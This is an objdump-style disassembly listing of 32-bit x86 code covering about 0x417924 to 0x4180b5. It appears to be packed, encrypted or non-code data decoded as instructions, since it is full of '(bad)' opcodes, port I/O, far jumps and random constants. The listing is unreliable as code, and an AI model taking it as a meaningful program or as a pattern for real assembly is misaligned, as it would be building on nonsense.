  417924:	sub    ebp,DWORD PTR [esi+0x6c22ebff]
  41792a:	mov    ds:0x70a5a9ce,al
  41792f:	and    ebp,DWORD PTR [ecx-0x1484fcf7]
  417935:	fsubp  st(7),st
  417937:	repnz mov ebx,0x9c218673
  41793d:	test   DWORD PTR [edx+eiz*2],0x2aa690eb
  417944:	and    ch,ah
  417946:	push   cs
  417947:	mov    esp,0x1afa30f8
  41794c:	xchg   ebx,eax
  41794d:	enter  0x8260,0x8f
  417951:	icebp  
  417952:	jge    0x4179cb
  417954:	and    eax,0x23dc3f30
  417959:	xchg   ecx,eax
  41795a:	xchg   ebx,eax
  41795b:	test   DWORD PTR [esi-0x69],eax
  41795e:	dec    dx
  417960:	arpl   cx,di
  417962:	outs   dx,BYTE PTR ds:[esi]
  417963:	adc    BYTE PTR [edx],dh
  417965:	cmp    al,0xb4
  417967:	or     eax,0x6d9ae6ae
  41796c:	les    ebx,FWORD PTR [ecx-0x342aa194]
  417972:	jo     0x4178ff
  417974:	fs jns 0x4179e1
  417977:	iret   
  417978:	mov    edi,0x8eb9c3d0
  41797d:	arpl   WORD PTR ds:[ebx],di
  417980:	aad    0xa4
  417982:	mov    bl,0x22
  417984:	bound  esi,QWORD PTR [edi]
  417986:	mov    eax,0x493c7618
  41798b:	push   eax
  41798c:	inc    ebp
  41798d:	lea    ebx,[ecx]
  41798f:	aad    0x89
  417991:	stos   DWORD PTR es:[edi],eax
  417992:	retf   
  417993:	pop    eax
  417994:	cmp    al,0xfa
  417996:	sub    bh,BYTE PTR [edi]
  417998:	fwait
  417999:	mov    ds:0x8e5198d,eax
  41799e:	pop    esp
  41799f:	pmuludq mm2,QWORD PTR ds:0xcfa2c12b
  4179a6:	pusha  
  4179a7:	push   edi
  4179a8:	bound  edi,QWORD PTR ds:0xa37ac21b
  4179ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179af:	jmp    0xaa43435d
  4179b4:	int3   
  4179b5:	or     al,cl
  4179b7:	inc    esi
  4179b8:	ret    
  4179b9:	daa    
  4179ba:	fsubrp st(6),st
  4179bc:	mov    dh,0xe3
  4179be:	test   BYTE PTR [edx],0x3b
  4179c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179c2:	or     DWORD PTR [esi+0x7c],0xb8eec388
  4179c9:	inc    esp
  4179ca:	push   ebp
  4179cb:	cmp    bl,dh
  4179cd:	push   edx
  4179ce:	xchg   ecx,eax
  4179cf:	fwait
  4179d0:	retf   0x6cda
  4179d3:	fisttp WORD PTR [ebx+0x28]
  4179d6:	sub    ebp,DWORD PTR [eax+0x63]
  4179d9:	add    ecx,DWORD PTR [edi]
  4179db:	in     al,0xd8
  4179dd:	push   0x7fc99268
  4179e2:	jmp    FWORD PTR [ecx+0x27]
  4179e5:	ficomp WORD PTR [esi+0x3492a49b]
  4179eb:	stc    
  4179ec:	in     eax,dx
  4179ed:	(bad)  
  4179ee:	bound  esi,QWORD PTR [ebx+0x50e4a19c]
  4179f4:	inc    edx
  4179f5:	sbb    BYTE PTR ds:0x18dab49e,dh
  4179fb:	dec    edx
  4179fc:	xor    eax,0x685c1a2b
  417a01:	mov    ah,0xe8
  417a03:	js     0x417a68
  417a05:	inc    esp
  417a06:	into   
  417a07:	push   edx
  417a08:	or     al,0x25
  417a0a:	push   ebp
  417a0b:	pop    es
  417a0c:	icebp  
  417a0d:	jbe    0x417a28
  417a0f:	sbb    ebx,edi
  417a11:	je     0xcbff4f1e
  417a17:	gs cwde 
  417a19:	sub    eax,0x88b30d10
  417a1e:	jp     0x417a4c
  417a20:	mov    ch,0xea
  417a22:	enter  0xa545,0x3e
  417a26:	xchg   esi,ebx
  417a28:	push   edx
  417a29:	or     BYTE PTR [ecx-0x38960117],dl
  417a2f:	mov    es,WORD PTR ds:0x89e22a3e
  417a35:	push   edi
  417a36:	dec    edx
  417a37:	mov    al,0x70
  417a39:	sti    
  417a3a:	pushf  
  417a3b:	or     eax,0xa3611c9c
  417a40:	xchg   ebp,eax
  417a41:	sbb    BYTE PTR [edi+0x51],bl
  417a44:	jne    0x417a36
  417a46:	push   cs
  417a47:	xor    eax,0x7335a4b0
  417a4c:	lock or BYTE PTR [esi+0x4927725e],dh
  417a53:	mov    bl,0x45
  417a55:	popa   
  417a56:	or     al,0x49
  417a58:	test   BYTE PTR [ebx-0x5fcbae78],dl
  417a5e:	jp     0x417a8c
  417a60:	push   eax
  417a61:	pop    eax
  417a62:	fldcw  WORD PTR [ecx+ebx*8+0x7f]
  417a66:	mov    ebp,DWORD PTR [ecx+0x4b]
  417a69:	out    dx,eax
  417a6a:	mov    BYTE PTR [eax-0x19],cl
  417a6d:	loopne 0x417ab2
  417a6f:	adc    ch,bh
  417a71:	ror    BYTE PTR [ebx-0x76],cl
  417a74:	mov    esi,0xdc1d4285
  417a79:	pop    ebx
  417a7a:	inc    esp
  417a7b:	cmc    
  417a7c:	mov    DWORD PTR ds:0xffa58c39,esi
  417a82:	sbb    DWORD PTR [ecx-0x106aaa73],eax
  417a88:	aam    0x3c
  417a8a:	add    al,0x0
  417a8c:	int3   
  417a8d:	pop    esp
  417a8e:	mov    bl,BYTE PTR [ecx]
  417a90:	js     0x417a2b
  417a92:	and    eax,0x67dfe7eb
  417a97:	push   0xac7230f8
  417a9c:	jb     0x417afe
  417a9e:	mov    edi,0x77f105d3
  417aa3:	fadd   st(5),st
  417aa5:	or     al,0xa8
  417aa7:	es in  al,0x51
  417aaa:	inc    esi
  417aab:	imul   esp,esi,0x477f789b
  417ab1:	adc    al,BYTE PTR [esi-0x3c1d6b7]
  417ab7:	mov    ecx,0x3605e7d1
  417abc:	jmp    0x417a7a
  417abe:	lods   eax,DWORD PTR ds:[esi]
  417abf:	xor    BYTE PTR [esi],cl
  417ac1:	stc    
  417ac2:	imul   ebp,DWORD PTR [ebp-0x69],0x210089b5
  417ac9:	imul   eax,ecx,0x65
  417acc:	mov    dh,0x28
  417ace:	cmp    eax,0xc95ab977
  417ad3:	push   0x4a060f58
  417ad8:	add    DWORD PTR [ebx+0x53261c68],eax
  417ade:	mov    esp,0x38bf2729
  417ae3:	xlat   BYTE PTR ds:[ebx]
  417ae4:	mov    esi,DWORD PTR [edx]
  417ae6:	add    cl,dl
  417ae8:	imul   ecx,DWORD PTR [eax],0x2a
  417aeb:	and    DWORD PTR [edx],0xffffffdf
  417aee:	mov    dh,0x8
  417af0:	and    cl,BYTE PTR [ebx]
  417af2:	loopne 0x417ac5
  417af4:	cmp    ecx,DWORD PTR [eax]
  417af6:	aad    0xbd
  417af8:	hlt    
  417af9:	cld    
  417afa:	out    dx,eax
  417afb:	in     eax,0xe4
  417afd:	outs   dx,BYTE PTR ds:[esi]
  417afe:	fsubr  QWORD PTR [edi+0x1c]
  417b01:	sti    
  417b02:	jmp    0xe87:0x15fcd68c
  417b09:	aas    
  417b0a:	mov    al,0x3e
  417b0c:	or     BYTE PTR [edx+0xd],cl
  417b0f:	xor    BYTE PTR [ecx],cl
  417b11:	jge    0x417aed
  417b13:	xor    al,0xfd
  417b15:	adc    al,0x69
  417b17:	aam    0x3a
  417b19:	pop    eax
  417b1a:	in     eax,0xb6
  417b1c:	fbstp  TBYTE PTR [edx]
  417b1e:	inc    eax
  417b1f:	jl     0x417b32
  417b21:	in     eax,dx
  417b22:	sub    DWORD PTR [ebp-0x42],esp
  417b25:	(bad)  
  417b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b27:	retf   0x46f0
  417b2a:	call   0xf0b4f49d
  417b2f:	in     al,0x3d
  417b31:	jnp    0x417ac4
  417b33:	data16 fsubrp st(5),st
  417b36:	dec    ebx
  417b37:	fadd   st,st(1)
  417b39:	ror    ah,1
  417b3b:	add    al,0x38
  417b3d:	call   FWORD PTR [edi]
  417b3f:	xchg   edi,eax
  417b40:	(bad)  
  417b41:	xor    al,0x98
  417b43:	in     al,0xdc
  417b45:	jmp    0xa03eb0fa
  417b4a:	pop    ebp
  417b4b:	pushf  
  417b4c:	inc    esp
  417b4d:	and    ah,dh
  417b4f:	std    
  417b50:	ins    DWORD PTR es:[edi],dx
  417b51:	jns    0x417b1f
  417b53:	pushf  
  417b54:	adc    al,0x2c
  417b56:	cmp    BYTE PTR ds:0x858d8b94,ch
  417b5c:	loopne 0x417b1c
  417b5e:	and    al,0xbf
  417b60:	cli    
  417b61:	sbb    dl,dl
  417b63:	scas   eax,DWORD PTR es:[edi]
  417b64:	push   eax
  417b65:	pop    edx
  417b66:	outs   dx,DWORD PTR ds:[esi]
  417b67:	pop    edx
  417b68:	(bad)  
  417b6a:	xchg   bl,dl
  417b6c:	imul   edi,DWORD PTR [edx+ebx*1],0xffffff8c
  417b70:	arpl   WORD PTR [edx-0x1ae6ecd7],ax
  417b76:	add    ebp,ebx
  417b78:	xor    al,0x46
  417b7a:	cmp    al,0xba
  417b7c:	(bad)
  417b7f:	add    al,0x26
  417b81:	mov    ah,0x14
  417b83:	jl     0x417b48
  417b85:	sbb    ebx,edx
  417b87:	mov    ch,0x4
  417b89:	(bad)  
  417b8b:	sub    al,0x53
  417b8d:	lock xor eax,0x98555a08
  417b93:	push   0x2d
  417b95:	push   esp
  417b96:	imul   ebx,edi,0x8e4af2c5
  417b9c:	sbb    eax,0x3798c84e
  417ba1:	outs   dx,DWORD PTR ds:[esi]
  417ba2:	aaa    
  417ba3:	arpl   WORD PTR [esi],bx
  417ba5:	fdiv   DWORD PTR [esi]
  417ba7:	std    
  417ba8:	bound  ebx,QWORD PTR [ecx]
  417baa:	xchg   esi,eax
  417bab:	pop    ebp
  417bac:	dec    edi
  417bad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bae:	shl    BYTE PTR [edx+edx*2+0x3cb9a866],1
  417bb5:	fstp   DWORD PTR [edi]
  417bb7:	pusha  
  417bb8:	sar    DWORD PTR [eax+0x7b],0x9e
  417bbc:	into   
  417bbd:	gs mov bl,0x21
  417bc0:	scas   al,BYTE PTR es:[edi]
  417bc1:	adc    DWORD PTR [edi-0x5a09eb54],edi
  417bc7:	loope  0x417be2
  417bc9:	xchg   esp,eax
  417bca:	xchg   edx,ebp
  417bcc:	inc    edi
  417bcd:	shr    DWORD PTR [edi],cl
  417bcf:	aaa    
  417bd0:	mov    edi,0xe31dc328
  417bd5:	dec    ebx
  417bd6:	xchg   ecx,eax
  417bd7:	outs   dx,BYTE PTR ds:[esi]
  417bd8:	lock lods eax,DWORD PTR ds:[esi]
  417bda:	push   ds
  417bdb:	into   
  417bdc:	mov    bl,0x1
  417bde:	arpl   WORD PTR es:[ebx-0x62],bx
  417be2:	cdq    
  417be3:	imul   ecx,esi,0x5c
  417be6:	imul   esi,DWORD PTR ds:0x2ceab6e2,0xffffffed
  417bed:	jle    0x417c2c
  417bef:	dec    ecx
  417bf0:	loope  0x417b78
  417bf2:	push   ss
  417bf3:	adc    eax,0xffa6ee2d
  417bf8:	retf   0xa2d3
  417bfb:	mov    esp,0x86688546
  417c00:	ins    BYTE PTR es:[edi],dx
  417c01:	popa   
  417c02:	scas   eax,DWORD PTR es:[edi]
  417c03:	sbb    BYTE PTR [edi+ecx*1-0x2210c4ab],cl
  417c0a:	pop    ss
  417c0b:	ja     0x417ba7
  417c0d:	or     bl,BYTE PTR [ecx]
  417c0f:	in     eax,dx
  417c10:	scas   eax,DWORD PTR es:[edi]
  417c11:	xchg   edi,eax
  417c12:	and    esi,esp
  417c14:	jae    0x417c05
  417c16:	leave  
  417c17:	or     dh,BYTE PTR [edi-0x75]
  417c1a:	(bad)  
  417c1b:	out    dx,eax
  417c1c:	cmp    DWORD PTR ds:0x2744dd36,0x5b
  417c23:	push   edx
  417c24:	arpl   WORD PTR [ecx],bp
  417c26:	mov    BYTE PTR [ebp+0x68],bl
  417c29:	mov    DWORD PTR [esi-0x38222837],esp
  417c2f:	cdq    
  417c30:	fs pushf 
  417c32:	loope  0x417c65
  417c34:	mov    esp,0xa46bc471
  417c39:	test   BYTE PTR [esi-0x16f03f88],cl
  417c3f:	xor    DWORD PTR [ebp+0x5a],ebp
  417c42:	push   esi
  417c43:	std    
  417c44:	fwait
  417c45:	or     BYTE PTR [esi-0x80],al
  417c48:	sbb    BYTE PTR [edi-0x58e603c3],dh
  417c4e:	les    ecx,FWORD PTR [edi+0x2b]
  417c51:	inc    ebp
  417c52:	imul   esi,DWORD PTR [edi+eax*4],0x36d893e9
  417c59:	adc    DWORD PTR [edx-0x7d],edx
  417c5c:	outs   dx,DWORD PTR ds:[esi]
  417c5d:	mov    al,0x4f
  417c5f:	hlt    
  417c60:	lods   al,BYTE PTR ds:[esi]
  417c61:	cld    
  417c62:	pop    ds
  417c63:	mov    ebx,0x8fad9fa4
  417c68:	arpl   si,si
  417c6a:	jmp    0x6296:0xe8db9538
  417c71:	les    edi,FWORD PTR [edx*1+0x2a584687]
  417c78:	or     esi,edx
  417c7a:	cmp    BYTE PTR [esi-0x6b87de8],bh
  417c80:	lock or DWORD PTR [esp+ecx*2+0x5e],esp
  417c85:	stos   BYTE PTR es:[edi],al
  417c86:	ret    0x53e7
  417c89:	jb     0x417c9a
  417c8b:	cmp    esp,ecx
  417c8d:	adc    DWORD PTR [ecx],0xffffffa6
  417c90:	lods   al,BYTE PTR ds:[esi]
  417c91:	out    0xd0,al
  417c93:	stos   BYTE PTR es:[edi],al
  417c94:	lahf   
  417c95:	push   ebx
  417c96:	or     al,0x37
  417c98:	test   eax,0x9e10c308
  417c9d:	stos   BYTE PTR es:[edi],al
  417c9e:	outs   dx,DWORD PTR ds:[esi]
  417c9f:	popa   
  417ca0:	pop    ds
  417ca1:	icebp  
  417ca2:	inc    eax
  417ca3:	out    0x8b,eax
  417ca5:	adc    eax,esi
  417ca7:	pop    es
  417ca8:	ficom  WORD PTR [ecx-0xe]
  417cab:	and    esi,DWORD PTR ds:0xc0c9cd5b
  417cb1:	scas   eax,DWORD PTR es:[edi]
  417cb2:	mov    ecx,0x1692de63
  417cb7:	jo     0x417c51
  417cb9:	pop    esp
  417cba:	add    al,0xfa
  417cbc:	inc    ebp
  417cbd:	test   al,0xf4
  417cbf:	inc    ebx
  417cc0:	add    edi,DWORD PTR [edx+0x8]
  417cc3:	je     0x417d1b
  417cc5:	xor    dl,BYTE PTR [eax-0x34]
  417cc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cc9:	adc    ebp,DWORD PTR [edi+0xf]
  417ccc:	pop    eax
  417ccd:	inc    edx
  417cce:	mov    al,ds:0x86cdade9
  417cd3:	jp     0x417cc0
  417cd5:	mov    edi,0xf521340b
  417cda:	mov    edx,0x84fa0794
  417cdf:	fcom   QWORD PTR [esi-0x52]
  417ce2:	cwde   
  417ce3:	jne    0x417ce4
  417ce5:	ret    
  417ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ce7:	adc    eax,0x3b6291ea
  417ced:	push   esi
  417cee:	mov    DWORD PTR [ebx-0x4e],esp
  417cf1:	es sub eax,0x74bbd8e1
  417cf7:	cdq    
  417cf8:	out    dx,al
  417cf9:	call   0x21e0ce92
  417cfe:	sahf   
  417cff:	cmp    eax,0xa21c78cb
  417d04:	or     bh,BYTE PTR [ecx-0x26ee3439]
  417d0a:	or     cl,BYTE PTR [edx]
  417d0c:	rcl    ch,0xb1
  417d0f:	bound  eax,QWORD PTR [ebx+0x30]
  417d12:	fcomp  QWORD PTR [esi+0x51]
  417d15:	inc    ecx
  417d16:	push   esp
  417d17:	es jnp 0x417d3d
  417d1a:	inc    ebx
  417d1b:	push   edi
  417d1c:	push   ecx
  417d1d:	scas   al,BYTE PTR es:[edi]
  417d1e:	adc    esi,DWORD PTR [ecx*8-0x7d8b2fbb]
  417d25:	stos   DWORD PTR es:[edi],eax
  417d26:	in     eax,dx
  417d27:	ror    BYTE PTR [edi-0x47],1
  417d2a:	repnz xchg esp,eax
  417d2c:	call   DWORD PTR [ebp-0x29a31d0f]
  417d32:	jp     0x417d0a
  417d34:	ficomp DWORD PTR [ebx+0x3478dc9c]
  417d3a:	push   esp
  417d3b:	std    
  417d3c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  417d3e:	push   ecx
  417d3f:	push   ecx
  417d40:	test   al,0x64
  417d42:	pop    esp
  417d43:	dec    DWORD PTR [ebx-0x15]
  417d46:	cs out 0x89,al
  417d49:	pushf  
  417d4a:	and    BYTE PTR [eax],dl
  417d4c:	jno    0x417dad
  417d4e:	dec    edx
  417d4f:	rol    bl,cl
  417d51:	ror    dl,0x60
  417d54:	(bad)  
  417d55:	jp     0x417d46
  417d57:	(bad)  
  417d58:	xchg   ecx,eax
  417d59:	push   ds
  417d5a:	inc    ecx
  417d5b:	out    0xce,al
  417d5d:	pop    eax
  417d5e:	test   eax,0xaedefeda
  417d63:	mov    dh,0xdc
  417d65:	scas   al,BYTE PTR es:[edi]
  417d66:	std    
  417d67:	call   0x886ba48a
  417d6c:	adc    dh,ah
  417d6e:	loop   0x417d5a
  417d70:	clc    
  417d71:	jns    0x417d09
  417d73:	sub    ah,BYTE PTR [ecx-0x421e0fc]
  417d79:	mov    ebp,0xa655706b
  417d7e:	adc    DWORD PTR [ebx-0xa445de4],0x3e
  417d85:	in     eax,dx
  417d86:	shl    BYTE PTR [ecx+0x4eb770e5],cl
  417d8c:	lahf   
  417d8d:	das    
  417d8e:	inc    edi
  417d8f:	jmp    DWORD PTR [ebx+0x43d80101]
  417d95:	fild   DWORD PTR [eax-0x23]
  417d98:	push   edx
  417d99:	pushw  ds
  417d9b:	adc    DWORD PTR [ecx+0x56],ebx
  417d9e:	mov    bl,0xf6
  417da0:	pusha  
  417da1:	lock sub BYTE PTR [edi],bh
  417da4:	push   edx
  417da5:	jg     0x417da3
  417da7:	stos   BYTE PTR es:[edi],al
  417da8:	mov    dl,BYTE PTR [edi*1-0x4af8b9e6]
  417daf:	jp     0x417e14
  417db1:	dec    esp
  417db2:	xlat   BYTE PTR ds:[ebx]
  417db3:	add    eax,0x13c28e58
  417db8:	mov    ah,0x99
  417dba:	cld    
  417dbb:	cmp    bh,BYTE PTR [edx-0x15996e52]
  417dc1:	inc    esi
  417dc2:	jnp    0x52c47999
  417dc8:	or     edx,esi
  417dca:	sbb    al,0xa5
  417dcc:	add    eax,0x6e202b75
  417dd1:	and    dl,dh
  417dd3:	push   esi
  417dd4:	add    BYTE PTR [eax],ch
  417dd6:	sub    eax,DWORD PTR fs:[ebp-0x35]
  417dda:	test   al,0xe6
  417ddc:	test   al,0x5f
  417dde:	test   ebx,edi
  417de0:	mov    dh,0x28
  417de2:	mov    edx,0x631fea9d
  417de7:	ins    DWORD PTR es:[edi],dx
  417de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417de9:	inc    esi
  417dea:	sbb    esp,DWORD PTR [esi]
  417dec:	adc    eax,0xf21216e0
  417df1:	jmp    0xdc5d850b
  417df6:	jae    0x417e52
  417df8:	jbe    0x417df7
  417dfa:	cwde   
  417dfb:	lock jle 0x417d81
  417dfe:	sbb    ecx,esi
  417e00:	sbb    BYTE PTR [ecx+0x3b],0xbd
  417e04:	nop
  417e05:	fstp   QWORD PTR [edi]
  417e07:	cmp    esi,DWORD PTR [edi]
  417e09:	mov    ds:0x65a58f43,eax
  417e0e:	mov    esp,0x1b281d6d
  417e13:	fist   DWORD PTR fs:[eax+0x635e5687]
  417e1a:	test   eax,0xfa310b89
  417e1f:	cmp    DWORD PTR [edx],ebp
  417e21:	push   es
  417e22:	imul   ebp,ecx,0x1612460c
  417e28:	push   ss
  417e29:	std    
  417e2a:	fld    st(6)
  417e2c:	aas    
  417e2d:	jg     0x417e56
  417e2f:	jnp    0x417dc2
  417e31:	xchg   edx,eax
  417e32:	jmp    0x417eb1
  417e34:	jb     0x417df8
  417e36:	enter  0xdd6,0x3c
  417e3a:	xchg   edi,eax
  417e3b:	sub    DWORD PTR [edi-0x77fea1a5],esi
  417e41:	stos   DWORD PTR es:[edi],eax
  417e42:	lods   al,BYTE PTR ds:[esi]
  417e43:	ds inc esp
  417e45:	jl     0x417e90
  417e47:	cmp    al,0x2
  417e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e4a:	and    BYTE PTR [ecx+0x35],dh
  417e4d:	dec    eax
  417e4e:	add    bh,ch
  417e50:	inc    ebx
  417e51:	fsubr  QWORD PTR [edx]
  417e53:	xchg   BYTE PTR [ebp-0x246471],dl
  417e59:	in     eax,0x1b
  417e5b:	push   ss
  417e5c:	cs pop edx
  417e5e:	pop    ds
  417e5f:	push   edi
  417e60:	inc    edx
  417e61:	mov    WORD PTR [edi+0x52d83795],fs
  417e67:	mov    esp,0x1343c1f2
  417e6c:	imul   edi,DWORD PTR [edx],0x2769c181
  417e72:	es dec ebx
  417e74:	in     al,0xd9
  417e76:	sti    
  417e77:	dec    ebp
  417e78:	xor    al,0xdc
  417e7a:	pop    esi
  417e7b:	push   ds
  417e7c:	stc    
  417e7d:	(bad)  [eax+0x2c]
  417e80:	dec    eax
  417e81:	sub    al,0x7c
  417e83:	push   cs
  417e84:	pop    ecx
  417e85:	nop
  417e86:	push   ecx
  417e87:	out    0xbc,al
  417e89:	call   0xc72c:0x8f5886b1
  417e90:	(bad)  
  417e92:	pop    ebp
  417e93:	mov    cs,WORD PTR [ecx]
  417e95:	inc    eax
  417e96:	in     al,dx
  417e97:	rol    BYTE PTR [esp+edx*1],cl
  417e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e9b:	pop    ebx
  417e9c:	pop    esp
  417e9d:	xchg   ebp,eax
  417e9e:	outs   dx,DWORD PTR ds:[esi]
  417e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ea0:	xchg   ecx,eax
  417ea1:	xchg   BYTE PTR ds:0xc3833700,bl
  417ea7:	cwde   
  417ea8:	repnz add edi,DWORD PTR [ebx+0x28]
  417eac:	in     eax,dx
  417ead:	xchg   ecx,eax
  417eae:	jae    0x417e8d
  417eb0:	stc    
  417eb1:	push   esi
  417eb2:	scas   al,BYTE PTR es:[edi]
  417eb3:	xor    al,0xf8
  417eb5:	call   0x654c:0x63cb421c
  417ebc:	popa   
  417ebd:	pop    ebx
  417ebe:	fsub   QWORD PTR [eax+0x77]
  417ec1:	or     al,0xa3
  417ec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ec4:	shl    BYTE PTR [esi-0x43],cl
  417ec7:	test   al,0x55
  417eca:	xor    eax,0xb139506b
  417ecf:	(bad)  
  417ed1:	cmc    
  417ed2:	sahf   
  417ed3:	stos   DWORD PTR es:[edi],eax
  417ed4:	loope  0x417eef
  417ed6:	sub    ch,ch
  417ed8:	das    
  417ed9:	dec    esp
  417eda:	ds inc eax
  417edc:	(bad)  
  417edd:	jmp    0x2cf9:0xe738dfb2
  417ee4:	clc    
  417ee5:	mov    al,0xd2
  417ee7:	jo     0x417ec4
  417ee9:	retf   
  417eea:	ret    
  417eeb:	neg    esi
  417eed:	popf   
  417eee:	aad    0xc
  417ef0:	or     eax,0xc8aadac4
  417ef5:	inc    ebx
  417ef6:	jl     0x417ea3
  417ef8:	dec    edx
  417efa:	or     BYTE PTR [eax-0x35],ch
  417efd:	jns    0x417eb2
  417eff:	or     eax,DWORD PTR [edi-0x26]
  417f02:	pop    ecx
  417f03:	mov    es,WORD PTR gs:[ecx-0xc33d6e3]
  417f0a:	jb     0x417f86
  417f0c:	jmp    0x9f35:0x9e2241e1
  417f13:	xor    ecx,eax
  417f15:	mov    ah,dl
  417f17:	add    bl,BYTE PTR [eax+ebp*8+0x23c0d656]
  417f1e:	mov    cl,0x52
  417f20:	lods   eax,DWORD PTR cs:[esi]
  417f22:	pop    eax
  417f23:	ins    BYTE PTR es:[edi],dx
  417f24:	mov    ebp,0x94c84777
  417f29:	test   al,0xf1
  417f2b:	mov    esi,0xc4313c52
  417f30:	cwde   
  417f31:	mov    ds:0x69da38da,al
  417f36:	arpl   bp,dx
  417f38:	jne    0x417edd
  417f3a:	add    edi,DWORD PTR [edx]
  417f3c:	outs   dx,BYTE PTR ds:[esi]
  417f3d:	adc    esp,DWORD PTR [ecx+0x10a724aa]
  417f43:	sub    edx,DWORD PTR [esi]
  417f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f46:	call   0x6de7:0xfb04d75c
  417f4d:	cmp    al,0xd6
  417f4f:	ret    
  417f50:	adc    al,BYTE PTR [edx+0x36]
  417f53:	rcl    DWORD PTR [esi],1
  417f55:	or     BYTE PTR [edx-0x374889c9],al
  417f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f5c:	cdq    
  417f5d:	test   al,0x37
  417f5f:	sbb    esi,eax
  417f61:	out    dx,al
  417f62:	xor    eax,0x853064c5
  417f67:	jge    0x417fc1
  417f69:	pop    ecx
  417f6a:	(bad)  
  417f6b:	sbb    bl,BYTE PTR [esi-0x195d1b67]
  417f71:	pop    ds
  417f72:	jo     0x417fd7
  417f74:	push   es
  417f75:	bnd jl 0x417f29
  417f78:	rol    BYTE PTR ds:0x29435f19,cl
  417f7e:	xchg   ecx,eax
  417f7f:	in     eax,dx
  417f80:	xlat   BYTE PTR ds:[ebx]
  417f81:	fldcw  WORD PTR [ebx]
  417f83:	xor    DWORD PTR [ecx],0xd81bfbd4
  417f89:	push   0xffffffa9
  417f8b:	(bad)
  417f8f:	paddd  mm0,QWORD PTR [ebx-0x22698176]
  417f96:	push   0xffffff91
  417f98:	jg     0x417fc3
  417f9a:	mov    eax,ds:0xd098f224
  417f9f:	mov    bl,0xb0
  417fa1:	shr    ah,cl
  417fa3:	cld    
  417fa4:	inc    ebp
  417fa5:	outs   dx,DWORD PTR ds:[esi]
  417fa6:	and    BYTE PTR [ecx-0x677e604b],al
  417fac:	dec    ebx
  417fad:	out    dx,eax
  417fae:	lahf   
  417faf:	pop    edx
  417fb0:	mov    esi,0xc67c6aaf
  417fb5:	pop    ebp
  417fb6:	cwde   
  417fb7:	adc    DWORD PTR [ecx],ecx
  417fb9:	push   ecx
  417fba:	push   esp
  417fbb:	push   ds
  417fbc:	adc    DWORD PTR cs:[edi],0xffffffee
  417fc0:	mov    edi,0x3689e96a
  417fc5:	xchg   edi,eax
  417fc6:	mov    bl,0x99
  417fc8:	cmp    ecx,edi
  417fca:	js     0x417f9e
  417fcc:	xor    esi,DWORD PTR ds:[esi-0x78a7abce]
  417fd3:	inc    DWORD PTR [ebx-0x48]
  417fd6:	(bad)  
  417fd7:	ds xchg edi,eax
  417fd9:	sti    
  417fda:	out    0x43,al
  417fdc:	sahf   
  417fdd:	dec    ebp
  417fde:	pop    ebx
  417fdf:	adc    BYTE PTR [eax-0x47a9fad1],bl
  417fe5:	pop    ebx
  417fe6:	adc    esp,DWORD PTR [edx-0x379b419e]
  417fec:	inc    edx
  417fed:	sub    eax,DWORD PTR [edi]
  417fef:	in     al,dx
  417ff0:	pop    edi
  417ff1:	xor    dh,BYTE PTR [ebx]
  417ff3:	lahf   
  417ff4:	jno    0x418042
  417ff6:	mov    esi,0xeaf6086f
  417ffb:	ror    BYTE PTR [ecx],1
  417ffd:	mov    ah,0x25
  417fff:	add    eax,0xd7942cf6
  418004:	jne    0x417f9a
  418006:	fimul  WORD PTR [edx-0x762de062]
  41800c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41800d:	mov    bh,0xaf
  41800f:	sar    eax,1
  418011:	xor    al,0xfa
  418013:	pop    edx
  418014:	jecxz  0x417fbd
  418016:	inc    ecx
  418017:	lea    eax,[ebx+0x59]
  41801a:	cmp    DWORD PTR [esi+0x3115e39b],esp
  418020:	xchg   DWORD PTR [ebx],edi
  418022:	dec    eax
  418023:	sbb    DWORD PTR [ebx],esi
  418025:	mov    bh,0x8c
  418027:	mov    ah,ah
  418029:	jmp    0xdbe3:0xca446d3
  418030:	dec    edx
  418031:	pop    ebx
  418032:	mov    ds:0xca3081e3,al
  418037:	xor    ch,0x81
  41803a:	dec    ebp
  41803b:	mov    esp,0x40cafea8
  418040:	stc    
  418041:	aad    0x8e
  418043:	outs   dx,DWORD PTR ds:[esi]
  418044:	sbb    DWORD PTR [edi+0x2d125ded],0xffffffae
  41804b:	loope  0x418056
  41804d:	add    bl,BYTE PTR ds:0x5d1526c3
  418053:	ss inc ebx
  418055:	nop
  418056:	in     al,0xb5
  418058:	lock cmp ah,ch
  41805b:	inc    esi
  41805c:	scas   eax,DWORD PTR es:[edi]
  41805d:	fsubp  st(3),st
  41805f:	pop    ss
  418060:	jb     0x418024
  418062:	jmp    0x31a513b8
  418067:	or     eax,0xc1b6bf6a
  41806c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41806d:	adc    eax,0x3e24b34a
  418072:	and    al,0xaa
  418074:	sbb    BYTE PTR [edx-0x5d10adc],cl
  41807a:	jne    0x418017
  41807c:	pop    DWORD PTR [edi-0x58db913c]
  418082:	mov    esi,0x4f2a7303
  418087:	ds dec edi
  418089:	mov    fs,WORD PTR [esi+0x215a726f]
  41808f:	js     0x4180a8
  418091:	sbb    cl,BYTE PTR [ebx+0x41]
  418094:	jl     0x4180b1
  418096:	lods   eax,DWORD PTR ds:[esi]
  418097:	or     ebp,DWORD PTR [ecx-0xff394c3]
  41809d:	mov    bh,0xad
  41809f:	jnp    0x418022
  4180a1:	pop    es
  4180a2:	jmp    0xd0d1968d
  4180a7:	cmp    esi,DWORD PTR [eax]
  4180a9:	test   BYTE PTR [eax-0x1],bl
  4180ac:	dec    ecx
  4180ad:	inc    edi
  4180ae:	sub    al,0x7a
  4180b0:	push   esi
  4180b1:	or     al,0x40
  4180b3:	out    0x99,al
  4180b5:	gs mov ah,0x53
